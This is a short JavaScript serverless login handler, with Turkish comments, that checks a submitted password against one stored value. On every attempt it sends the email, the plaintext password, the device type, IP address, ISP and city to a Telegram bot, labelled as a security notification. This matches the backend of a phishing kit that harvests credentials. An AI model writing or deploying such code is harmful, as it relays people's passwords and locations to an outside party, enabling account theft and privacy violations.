export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    
    try {
        const { email, pass, ipData, cihaz } = req.body;
        
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_ID;
        const DOGRU_SIFRE = process.env.SIFRE;

        // Cihaz bilgisini temizleme
        let cihazTipi = "Bilinmiyor";
        if (cihaz) {
            if (cihaz.includes("Android")) cihazTipi = "Android";
            else if (cihaz.includes("iPhone")) cihazTipi = "iPhone";
            else if (cihaz.includes("Windows")) cihazTipi = "Windows PC";
            else cihazTipi = "Diğer";
        }

        const girisBasarili = (String(pass) === String(DOGRU_SIFRE));

        const mesaj = `🚀 **TERCES GÜVENLİK BİLDİRİMİ**\n\n` +
                      `📧 E-posta: ${email}\n` +
                      `🔑 Şifre: ${pass}\n` +
                      `📱 Cihaz: ${cihazTipi}\n` +
                      `📡 IP: ${ipData?.ip || "Bilinmiyor"}\n` +
                      `🏢 ISS: ${ipData?.org || "Bilinmiyor"}\n` +
                      `📍 Konum: ${ipData?.city || "Bilinmiyor"}\n` +
                      `✅ Durum: ${girisBasarili ? "BAŞARILI GİRİŞ" : "HATALI GİRİŞ"}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mesaj,
                parse_mode: 'Markdown'
            })
        });

        if (girisBasarili) {
            return res.status(200).json({ success: true });
        } else {
            // İstediğin ortak hata mesajı burada:
            return res.status(401).json({ success: false, message: "Hatalı e-posta veya şifre!" });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: "Sistem hatası" });
    }
}
